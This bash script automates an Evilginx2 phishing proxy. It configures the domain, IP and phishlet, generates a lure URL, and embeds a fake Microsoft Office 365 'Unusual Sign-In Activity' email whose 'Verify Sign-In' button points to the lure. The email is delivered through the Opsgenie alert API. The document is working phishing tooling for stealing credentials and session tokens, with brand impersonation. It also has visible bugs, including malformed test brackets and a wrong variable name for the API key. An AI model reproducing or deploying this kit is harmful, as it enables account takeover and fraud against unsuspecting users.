#!/bin/bash

setup_evilginx() {
    domain_name=$1
    host_ip=$2
    default_phishlet=$3
    
    # Wait for a specific log message that confirms the service is running
    while ! pgrep -x "evilginx" > /dev/null; do
    echo "Waiting for Evilginx2 service to start..."
    sleep 2
    done
    
    echo "Evilginx2 is running. Proceeding with configuration."
    
    echo "Setting up Evilginx for domain: $domain_name"
    # Set up the hostname (domain or subdomain)
    #sudo evilginx config domain "$subdomain"
    config domain "$domain_name"
    
    # Bind to the IP address
    #sudo evilginx config ip "$host_ip"
    config ip "$host_ip"    
    # Enable the phishlet
    #sudo evilginx phishlets enable $default_phishlet
    if ! phishlets enable "$default_phishlet"; then
    echo "Failed to enable phishlet" >&2
    exit 1
    fi    
}

create_lure() {
    phishlet=$1
    hostname=$2
    redirect_url=$3
    
    if ! lures create "$phishlet" >/dev/null 2>&1; then
        echo "Error: Failed to create lure for phishlet '$phishlet'."
        return 1
    fi

    # Get the generated URL
    local lure_url
    lure_url=$(lures get-url "$phishlet" "$hostname" 2>/dev/null)
    if [[ -z "$lure_url" ]]; then
        echo "Error: Failed to retrieve lure URL for phishlet '$phishlet' and hostname '$hostname'."
        return 1
    fi

    # Set the redirect URL
    if ! lures redirect "$phishlet" "$redirect_url" >/dev/null 2>&1; then
        echo "Error: Failed to set redirect URL '$redirect_url' for phishlet '$phishlet'."
        return 1
    fi

    # If all commands are successful, return the URL
    echo "$lure_url"
    return 0
}

#Function to send an alert to Opsgenie with HTML content and a configurable URL
send_opsgenie_alert() {
    # Parameters passed to the function
    local API_KEY="$1"
    local API_URL="$2"
    local LOGIN_URL="$3"

    # HTML template with a placeholder for the URL
    local HTML_TEMPLATE="<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Unusual Sign-in Activity</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f2f1;
            color: #333;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 40px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .header {
            text-align: center;
            padding: 10px;
        }
        .header img {
            width: 150px;
        }
        .logo {
            width: 200px;
            margin: 20px 0;
        }
        h1 {
            color: #005a9e;
            font-size: 24px;
        }
        p {
            line-height: 1.6;
        }
        .button-container {
            text-align: center;
            margin-top: 20px;
        }
        .btn {
            display: inline-block;
            padding: 12px 24px;
            font-size: 16px;
            color: #fff;
            background-color: #0078d4;
            border-radius: 4px;
            text-decoration: none;
            margin: 10px;
            transition: background-color 0.3s ease;
        }
        .btn:hover {
            background-color: #005a9e;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #999;
            margin-top: 40px;
        }
        .footer a {
            color: #0078d4;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"header\">
            <img src=\"https://upload.wikimedia.org/wikipedia/commons/d/db/Office_365_logo.svg\" alt=\"Office 365\" class=\"logo\">
        </div>
        <h1>Unusual Sign-In Activity Detected</h1>
        <p>We noticed an unusual sign-in attempt to your Office 365 account. For your security, please verify this activity.</p>
        <p>If this was you, please sign in to your account to confirm your identity. If this wasn’t you, we recommend reviewing your account activity and changing your password immediately.</p>

        <div class=\"button-container\">
            <a href=\"$LOGIN_URL\" class=\"btn\">Verify Sign-In</a>
        </div>

        <p>If you did not request this, no further action is required.</p>

        <div class=\"footer\">
            <p>&copy; 2024 Microsoft Corporation. All rights reserved.</p>
            <p><a href=\"https://privacy.microsoft.com\">Privacy & Cookies</a> | <a href=\"https://support.microsoft.com\">Support</a></p>
        </div>
    </div>
</body>
</html>"

    # Escape double quotes inside the HTML content
    local ESCAPED_HTML_CODE=$(echo "$HTML_TEMPLATE" | sed 's/"/\\"/g')

    # Define the alert payload parameters
    local MESSAGE="HTML Code Test Alert"
    local DESCRIPTION="Here is the HTML code:\n\n$ESCAPED_HTML_CODE"
    local ALIAS="html-code-test-001"
    local PRIORITY="P3"
    local USER="user@example.com"

    # Send the alert using curl
    local response=$(curl -s -X POST "$API_URL" \
      -H "Authorization: GenieKey $API_KEY" \
      -H "Content-Type: application/json" \
      -d '{
            "message": "'"$MESSAGE"'",
            "description": "'"$DESCRIPTION"'",
            "alias": "'"$ALIAS"'",
            "priority": "'"$PRIORITY"'",
            "user": "'"$USER"'"
          }')

    # Output the response from the API
    echo "Response: $response"
}

# Read configuration from config.json
config_file="config.json"
domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
opsgenie_api_key=$(jq -r '.Opsgenie_API_Key' "$config_file")

#Make the needed shared subirectories
mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data

# Start the Evilginx2 service in the background
/bin/evilginx -p /app/phishlets/ -developer -debug

# Check if any of the critical values are empty, "", or "none"
if [ -z "$domain_name"]; then
    echo "Error: 'domain_name' is missing." >&2
    exit 1
fi

if [ -z "$host_ip"]; then
    echo "Error: 'host_ip' is missing." >&2
    exit 1
fi

if [ -z "$default_phishlet"]; then
    echo "Error: 'default_phishlet' is missing." >&2
    exit 1
fi

# Setup Evilginx2
setup_evilginx "$domain_name" "$host_ip" "$default_phishlet"

# Check if default_redirect is missing
if [ -z "$default_redirect"]; then
    echo "Error: 'default_redirect' is missing." >&2
    exit 1
fi

# Automate multiple lure creation
lure_url=$(create_lure "$default_phishlet" "$domain_name" "$default_redirect")
API_URL="https://api.opsgenie.com/v2/alerts"
# Check if the Lure function call was successful
if [[ $? -eq 0 ]]; then
    echo "Lure created successfully: $lure_url"
    
    # Check if opsgenie_api_key is missing
    if [ -z "$opsgenie_api_key"]; then
        echo "Error: 'opsgenie_api_key' is missing." >&2
    else
        send_opsgenie_alert "$API_KEY" "$API_URL" "$lure_url"
        echo "Sent Opsgenie Lure Alert"
    fi

else
    echo "Failed to create lure."
fi
